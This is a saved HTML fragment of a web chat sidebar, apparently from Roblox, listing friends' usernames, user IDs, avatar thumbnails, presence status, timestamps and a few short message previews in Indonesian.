<div id="chat-header" class="chat-windows-header chat-header">

                
<div class="chat-header-label" ng-click="toggleChatContainer()">
 
<span class="font-caption-header chat-header-title ng-binding" ng-bind="'Heading.Chat' | translate">
Chat
</span>
 
</div>

                
<div class="chat-header-action">
 
<span class="xsmall notification-red notification ng-binding" ng-show="chatLibrary.chatLayout.collapsed && chatViewModel.unreadConversationCount">
 ✦ 
</span>
 
<span>
 
<span id="chat-group-create" class="icon-chat-group-create ng-hide" ng-hide="chatLibrary.chatLayout.collapsed 
                        || chatLibrary.chatLayout.errorMaskEnable 
                        || chatLibrary.chatLayout.chatLandingEnabled 
                        || chatLibrary.chatLayout.pageDataLoading 
                        || !getIsChatEnabled()
                        || !getIsGroupChatEnabled()" ng-click="launchDialog(newGroup.layoutId)" uib-tooltip="Add at least 2 people to create chat group" tooltip-placement="bottom-right">

</span>
 
</span>

                
</div>

            
</div>

            
<!-- ngIf: !(chatLibrary.chatLayout.chatLandingEnabled || !getIsChatEnabled()) -->

            
<div id="chat-body" class="chat-body ng-scope" ng-show="!chatLibrary.chatLayout.errorMaskEnable && !chatLibrary.chatLayout.pageDataLoading && !chatLibrary.chatLayout.pageInitializing" ng-if="!(chatLibrary.chatLayout.chatLandingEnabled || !getIsChatEnabled())">

                
<div class="border-bottom chat-search" ng-class="{'chat-search-focus': chatLibrary.chatLayout.searchFocus}">
 
<span>
 
<input type="text" placeholder="Search for Connections" class="input-field chat-search-input font-caption-body ng-pristine ng-untouched ng-valid ng-empty" ng-model="chatViewModel.searchTerm" ng-focus="chatLibrary.chatLayout.searchFocus = true">
 
</span>
                    
<span class="icon-chat-search">

</span>
 
<span class="icon-chat-search-cancel" ng-click="cancelSearch()">

</span>
 
</div>

                
<div id="chat-friend-list" class="rbx-scrollbar chat-friend-list ng-scope mCustomScrollbar _mCS_1" lazy-load="">

                    
<div id="mCSB_1" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" tabindex="0">

                        
<div id="mCSB_1_container" class="mCSB_container" style="position:relative; top:0; left:0;" dir="ltr">

                            
<ul id="chat-friends" class="chat-friends">

                                
<!-- ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-354934038">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="354934038" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="354934038">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="354934038">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-5BA3314CE0A5B484D8E793CBAADB65CE-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="354934038" title="354934038" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-5BA3314CE0A5B484D8E793CBAADB65CE-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status game" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Kesemutan
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Yesterday
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8870923234">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8870923234" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8870923234">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8870923234">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-762D18657F9A42E96D7D73103459E673-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8870923234" title="8870923234" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-762D18657F9A42E96D7D73103459E673-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
asepGemoy
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 27
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-7839729396">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="7839729396" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="7839729396">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="7839729396">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0DC4B92615E5F3FC83467CAE410DB90C-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="7839729396" title="7839729396" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0DC4B92615E5F3FC83467CAE410DB90C-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
rraaiihn
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Sat
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-816bb847-5448-5d8a-85fe-5ae4e56e529b">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8658139428" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8658139428">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8658139428">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6265394B29E8A6111F02202CE1CB28A1-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8658139428" title="8658139428" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6265394B29E8A6111F02202CE1CB28A1-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
paelamigos
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Fri
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 ngntd keluar 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-d0bee469-2275-5192-843f-63b6904919ad">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8889576455" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8889576455">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8889576455">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3E8DF799B28D3D2D4028C19356F19F45-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8889576455" title="8889576455" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3E8DF799B28D3D2D4028C19356F19F45-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status online" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding unread" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
jiaa
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope font-bold secondary unread" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 23
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope unread" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 ohh oke 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-7306583286">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="7306583286" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="7306583286">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="7306583286">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-38AEF50CD4ABC731E3034966A6D90529-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="7306583286" title="7306583286" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-38AEF50CD4ABC731E3034966A6D90529-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Xoraa
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 23
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-3579425434">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="3579425434" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="3579425434">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="3579425434">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-CFFF1DAA03CE7FFC9C6FE72542233B50-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="3579425434" title="3579425434" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-CFFF1DAA03CE7FFC9C6FE72542233B50-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status game" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
bubbles
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 23
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-7056107357">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="7056107357" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="7056107357">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="7056107357">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

